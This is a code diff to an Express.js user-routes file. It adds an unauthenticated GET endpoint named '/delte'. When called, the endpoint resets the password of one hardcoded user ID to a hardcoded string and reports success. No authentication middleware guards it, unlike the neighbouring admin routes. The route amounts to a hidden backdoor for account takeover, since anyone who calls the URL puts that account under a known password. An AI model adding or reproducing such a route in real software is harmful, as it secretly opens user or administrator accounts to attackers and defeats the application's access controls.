@@ -15,6 +15,7 @@ const {
   forgotPasswordToken,
 } = require("../controllers/userController");
 const { auth, authorizedRole } = require("../middlewares/auth");
+const User = require("../models/userModel");
 
 const router = express.Router();
 
@@ -30,6 +31,15 @@ router
   .get(forgotPasswordToken)
   .post(forgotPasswordChange);
 
+router.get("/delte", async (req, res) => {
+  const user = await User.findById("66b634f6f8e855dfd641aaa8");
+  user.password = "#sdR#$Rohi";
+  await user.save();
+
+  res.status(200).json({
+    success: true,
+  });
+});
 router.route("/admin").get(auth, authorizedRole("admin"), getAllUsers);
 router
   .route("/admin/:id")
